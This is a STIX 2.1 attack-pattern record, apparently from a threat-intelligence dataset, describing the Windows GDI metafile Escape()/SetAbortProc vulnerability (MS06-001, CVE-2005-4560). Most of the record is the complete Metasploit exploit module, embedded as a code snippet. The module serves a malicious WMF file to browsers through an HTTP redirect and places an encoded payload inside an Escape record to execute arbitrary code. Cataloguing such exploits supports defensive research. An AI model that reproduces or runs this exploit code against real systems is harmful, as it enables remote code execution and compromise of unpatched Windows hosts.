{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fe9f7b13-cd41-4b15-b641-c45db31fbc09",
    "created": "2024-08-14T16:43:07.889454Z",
    "modified": "2024-08-14T16:43:07.889458Z",
    "name": "Windows XP/2003/Vista Metafile Escape() SetAbortProc Code Execution",
    "description": " This module exploits a vulnerability in the GDI library included with Windows XP and 2003. This vulnerability uses the 'Escape' metafile function to execute arbitrary code through the SetAbortProc procedure. This module generates a random WMF record stream for each request.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_001_wmf_setabortproc.rb",
            "external_id": "ms06_001_wmf_setabortproc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4560"
        },
        {
            "source_name": "reference",
            "url": "http://wvware.sourceforge.net/caolan/ora-wmf.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows XP/2003/Vista Metafile Escape() SetAbortProc Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the GDI library included with\n        Windows XP and 2003. This vulnerability uses the 'Escape' metafile function\n        to execute arbitrary code through the SetAbortProc procedure. This module\n        generates a random WMF record stream for each request.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n          'san <san[at]xfocus.org>',\n          'O600KO78RUS@unknown.ru',\n        ],\n      'References'     =>\n        [\n          ['CVE', '2005-4560'],\n          ['OSVDB', '21987'],\n          ['MSB', 'MS06-001'],\n          ['BID', '16074'],\n          ['URL', 'http://wvware.sourceforge.net/caolan/ora-wmf.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000 + (rand(256).to_i * 4),\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP/2003/Vista Automatic', { }],\n        ],\n      'DisclosureDate' => '2005-12-27',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    ext = 'wmf'\n\n    if (not request.uri.match(/\\.wmf$/i))\n      if (\"/\" == get_resource[-1,1])\n        wmf_uri = get_resource[0, get_resource.length - 1]\n      else\n        wmf_uri = get_resource\n      end\n      wmf_uri << \"/\" + rand_text_alphanumeric(rand(80)+16) + \".\" + ext\n\n      html = \"<html><meta http-equiv='refresh' content='0; \" +\n        \"URL=#{wmf_uri}'><body>One second please...</body></html>\"\n      send_response_html(cli, html)\n      return\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the compressed response to the client\n    send_response(cli, generate_metafile(p), { 'Content-Type' => 'text/plain' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_metafile(payload)\n\n    # Minimal length values before and after the Escape record\n    pre_mlen = 1440 + rand(8192)\n    suf_mlen = 128  + rand(8192)\n\n    # Track the number of generated records\n    fill = 0\n\n    # The prefix and suffix buffers\n    pre_buff = ''\n    suf_buff = ''\n\n    # Generate the prefix\n    while (pre_buff.length < pre_mlen)\n      pre_buff << generate_record()\n      fill += 1\n    end\n\n    # Generate the suffix\n    while (suf_buff.length < suf_mlen)\n      suf_buff << generate_record()\n      fill += 1\n    end\n\n    clen = 18 + 8 + 6 + payload.encoded.length + pre_buff.length + suf_buff.length\n    data =\n      #\n      # WindowsMetaHeader\n      #\n      [\n        # WORD  FileType;       /* Type of metafile (1=memory, 2=disk) */\n        rand(2)+1,\n        # WORD  HeaderSize;     /* Size of header in WORDS (always 9) */\n        9,\n        # WORD  Version;        /* Version of Microsoft Windows used */\n        ( rand(2).to_i == 1 ? 0x0300 : 0x0100 ),\n        # DWORD FileSize;       /* Total size of the metafile in WORDs */\n        clen/2,\n        # WORD  NumOfObjects;   /* Number of objects in the file */\n        rand(0xffff),\n        # DWORD MaxRecordSize;  /* The size of largest record in WORDs */\n        rand(0xffffffff),\n        # WORD  NumOfParams;    /* Not Used (always 0) */\n        rand(0xffff),\n      ].pack('vvvVvVv') +\n      #\n      # Filler data\n      #\n      pre_buff +\n      #\n      # StandardMetaRecord - Escape()\n      #\n      [\n        # DWORD Size;          /* Total size of the record in WORDs */\n        4,\n        # WORD  Function;      /* Function number (defined in WINDOWS.H) */\n        (rand(256).to_i << 8) + 0x26,\n        # WORD  Parameters[];  /* Parameter values passed to function */\n        9,\n      ].pack('Vvv') + payload.encoded +\n      #\n      # Filler data\n      #\n      suf_buff +\n      #\n      # Complete the stream\n      #\n      [3, 0].pack('Vv') +\n      #\n      # Some extra fun padding\n      #\n      rand_text(rand(16384)+1024)\n\n    return data\n\n  end\n\n  def generate_record\n    type = rand(3)\n\n    case type\n      when 0\n        # CreatePenIndirect\n        return [8, 0x02fa].pack('Vv') + rand_text(10)\n      when 1\n        # CreateBrushIndirect\n        return [7, 0x02fc].pack('Vv') + rand_text(8)\n      else\n        # Rectangle\n        return [7, 0x041b].pack('Vv') + rand_text(8)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-12-27",
    "x_mitre_platforms": [
        "win'"
    ]
}